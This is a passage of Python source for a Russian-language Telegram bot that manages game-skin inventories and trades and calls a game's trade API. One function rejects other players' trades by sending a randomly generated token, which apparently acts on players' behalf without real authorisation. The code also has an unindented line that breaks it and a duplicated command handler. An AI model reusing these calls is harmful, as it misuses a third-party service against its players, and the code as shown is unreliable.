        await context.bot.send_message(chat_id=update.callback_query.from_user.id, text="Выберите действие:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("Выберите действие:", reply_markup=reply_markup)

async def show_outgoing_exchanges(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    exchanges = load_exchanges()
    outgoing = {eid: ex for eid, ex in exchanges.items() if ex['initiator_id'] == user_id and ex['status'] == 'pending'}
    if not outgoing:
        await update.message.reply_text("Нет исходящих обменов.")
        return
    text = "Ваши исходящие запросы:\n"
    keyboard = []
    for eid, ex in outgoing.items():
        _, target_item = get_item_owner(ex['target_skin_id'])
        if target_item:
            skin_name = get_skin_name(target_item['skin_code'])
            mod_name = get_modifier_name(target_item['modifier'])
            button_text = f"{skin_name} - {mod_name}"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"exchange|view_out|{eid}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def auto_reject_trade(trade_id: str, player_id: str):
    await asyncio.sleep(1)
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
    url = f"{API_BASE_URL}/trades/respondOffer"
    params = {
        'token': token,
        'playerID': player_id,
        'offerID': trade_id,
        'receiverMessage': "Обмен отклонён автоматически",
        'accepted': "false"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, timeout=5) as resp:
                if resp.status == 200:
                    logger.info(f"✅ Трейд {trade_id} автоматически отклонён")
                else:
                    logger.error(f"❌ Ошибка при отклонении трейда {trade_id}: {resp.status}")
    except Exception as e:
        logger.error(f"❌ Исключение при отклонении трейда {trade_id}: {e}")


def send_skin_to_game(player_id: str, skin: str) -> Tuple[bool, Optional[str], str]:
    try:
        skin = skin.strip()
        match = re.match(r"['\"](.+?)['\"]\s*\*\s*(\d+)", skin)
        if not match:
            match = re.match(r"(.+?)\s*\*\s*(\d+)", skin)
        if match:
            base = match.group(1)
            count = int(match.group(2))
            skin = base * count
        unique_code = '#' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        params, trade_message = build_trade_offer_params(game_id=player_id, skin=skin, unique_code=unique_code, config_path=SENDER_PROFILE_FILE)
        response = requests.get("https://api.efezgames.com/v1/trades/createOffer", params=params, timeout=30)
        response_text = response.text.strip()
        resp_json = {}
        try: resp_json = response.json()
        except Exception: pass
        if response.status_code == 200 and ('"success":true' in response_text or 'success":true' in response_text or resp_json.get('offerID') or resp_json.get('_id') or resp_json.get('id')):
            trade_id = resp_json.get('offerID') or resp_json.get('_id') or resp_json.get('id')
            return True, trade_id, trade_message
        low = response_text.lower()
        if "another trade active" in low:
            return False, None, "❌ У вас уже есть активный трейд! Примите или отклоните предыдущий трейд в игре."
        if "access denied" in low:
            return True, None, trade_message
        if "invalid receiverid" in low:
            return False, None, "❌ Ошибка API: invalid receiverID"
        return False, None, f"❌ Ошибка API: {response_text[:200]}"
    except requests.exceptions.Timeout:
        return False, None, "⏱️ Время ожидания истекло. Проверьте подключение к интернету."
    except requests.RequestException as e:
        return False, None, f"🌐 Ошибка сети: {str(e)}"
    except Exception as e:
        return False, None, f"❌ Неожиданная ошибка: {str(e)}"

def get_nick_by_game_id(game_id: str) -> str:
    players = load_json(PLAYERS_FILE, {})
    for pdata in players.values():
        if pdata.get('game_id') == game_id:
            return pdata.get('game_nick', 'неизвестно')
    return 'неизвестно'

async def exchange_friend_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|', 1)
    if len(data) < 2:
        await query.edit_message_text("❌ Ошибка: неверные данные")
        return
    friend_nick = data[1]

    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(query.from_user.id))
    if not current_user:
        await query.edit_message_text("❌ Вы не зарегистрированы")
        return

    if friend_nick not in current_user.get('friends', []):
        await query.edit_message_text("❌ Этот пользователь не в вашем списке друзей")
        return

    friend_id = get_player_by_nick(friend_nick, players)
    if not friend_id:
        await query.edit_message_text("❌ Друг не найден в базе")
        return

    context.user_data['last_inventory_target'] = friend_id
    context.user_data['last_friend_nick'] = friend_nick
    await show_inventory(update, context, friend_id, query.from_user.id, page=0, mode="friend_exchange")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await skin_download_command(update, context)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        running = [name for name, task in active_tasks.items() if not task.done()]
        await update.message.reply_text("Активные задачи: " + (", ".join(running) if running else "нет"))
        return
    task_name = " ".join(args).strip()
    task = active_tasks.get(task_name)
    if task and not task.done():
        task.cancel()
        await update.message.reply_text(f"✅ Задача остановлена: {task_name}")
    else:
        await update.message.reply_text("❌ Такая задача не найдена или уже остановлена.")

async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /send <чат> <текст>")
        return
    channel = args[0].upper()
    message = " ".join(args[1:]).strip()
    sender_id = sender_ids.get(update.effective_chat.id, DEFAULT_SENDER_ID)
    success = send_chat_message(sender_id, message, channel)
    await update.message.reply_text(f"{'✅' if success else '❌'} " + (f"Сообщение отправлено в чат {channel}" if success else "Не удалось отправить сообщение"))

# ============= MAIN =============
def main():
    os.makedirs("data", exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs("skins", exist_ok=True)

    load_skin_names()
    load_modifiers()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CallbackQueryHandler(back_handler, pattern="^back$"))
app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(chat_selected, pattern='^reg_chat_'))
    app.add_handler(CommandHandler("confirm", confirm))

    app.add_handler(CommandHandler("profile", show_user_profile))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("help_player", help_player_command))

    app.add_handler(CommandHandler("money", money_command))
    app.add_handler(CommandHandler("money_give", money_give_command))
    app.add_handler(CommandHandler("money_set", money_set_command))
    app.add_handler(CommandHandler("money_take", money_take_command))

    app.add_handler(CommandHandler("tokens", tokens_command))
    app.add_handler(CommandHandler("tokens_give", tokens_give_command))
    app.add_handler(CommandHandler("tokens_set", tokens_set_command))
    app.add_handler(CommandHandler("tokens_take", tokens_take_command))

    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))

    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("deladmin", deladmin_command))

    app.add_handler(CommandHandler("skin", skin_add_command))
    app.add_handler(CommandHandler("inventory", inventory_command))
    app.add_handler(CommandHandler("myitems", myitems_command))

    app.add_handler(CommandHandler("monitor", monitor_command))
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("parsing", parsing_command))
    app.add_handler(CommandHandler("nuke", nuke_command))                 # обновлённая команда
    app.add_handler(CommandHandler("edit", edit_command))
    app.add_handler(CommandHandler("send", send_command))
    app.add_handler(CommandHandler("download", download_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("channels", channels_command))
    app.add_handler(CommandHandler("setlink", setlink_command))
    app.add_handler(CommandHandler("setid", setid_command))
    app.add_handler(CommandHandler("showid", showid_command))
    app.add_handler(CommandHandler("senderprofile", senderprofile_command))
    app.add_handler(CommandHandler("skin", skin_download_command))

    app.add_handler(CommandHandler("bd", bd_command))

    app.add_handler(CommandHandler("id", id_command))
    app.add_handler(CommandHandler("bot", bot_command))

    app.add_handler(CallbackQueryHandler(admin_inventory_callback, pattern='^admin_inventory\|'))
    app.add_handler(CallbackQueryHandler(friend_inventory_callback, pattern='^friend_inventory\|'))

    app.add_handler(CallbackQueryHandler(friend_accept_callback, pattern='^friend_accept\|'))
    app.add_handler(CallbackQueryHandler(friend_decline_callback, pattern='^friend_decline\|'))
    app.add_handler(CallbackQueryHandler(toggle_auto_friend_callback, pattern='^toggle_auto_friend$'))

    app.add_handler(CallbackQueryHandler(inventory_navigation_callback, pattern='^(nav|item|back_to_)'))
    app.add_handler(CallbackQueryHandler(item_action_callback, pattern='^item\|(withdraw|delete|exchange|exchange_from_friend|select|send_exchange)'))
    app.add_handler(CallbackQueryHandler(exchange_callback, pattern='^exchange\|(accept|decline|info|cancel)'))
    app.add_handler(CallbackQueryHandler(exchange_view_callback, pattern='^exchange\|(view_in|view_out)'))

    app.add_handler(CallbackQueryHandler(exchange_friend_callback, pattern='^exchange_friend\|'))
    app.add_handler(CallbackQueryHandler(exchange_view_skin_callback, pattern='^exchange_view_skin\|'))
    app.add_handler(CallbackQueryHandler(exchange_back_callback, pattern='^exchange_back\|'))

    app.add_handler(CallbackQueryHandler(toggle_friend_requests_callback, pattern='^toggle_friend_requests$'))
    app.add_handler(CallbackQueryHandler(toggle_accept_trades_callback, pattern='^toggle_accept_trades$'))
    app.add_handler(CallbackQueryHandler(profile_cost_callback, pattern='^profile_cost_'))

    app.add_handler(CommandHandler("promo", promo_command))
    app.add_handler(CallbackQueryHandler(promo_time_callback, pattern='^promo_time_'))
    app.add_handler(CallbackQueryHandler(promo_uses_callback, pattern='^promo_uses_'))

    app.add_handler(CommandHandler("everyone", everyone_command))

    # Новый callback для кнопки после NUKE
    app.add_handler(CallbackQueryHandler(nuke_view_callback, pattern='^nuke_view\|'))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("🚀 Бот с профилем, инвентарём, обменами, настройками, промокодами, рассылкой и командой /id запущен.")
    logger.info(f"👤 Владелец ID: {OWNER_ID}")
    logger.info("📁 Данные сохраняются в папке data/")
    print("🚀 Бот с профилем, инвентарём, обменами, настройками, промокодами, рассылкой и командой /id запущен.")
    print("👤 Владелец ID:", OWNER_ID)
    print("📁 Данные сохраняются в папке data/")
    app.run_polling()

if __name__ == "__main__":
    main()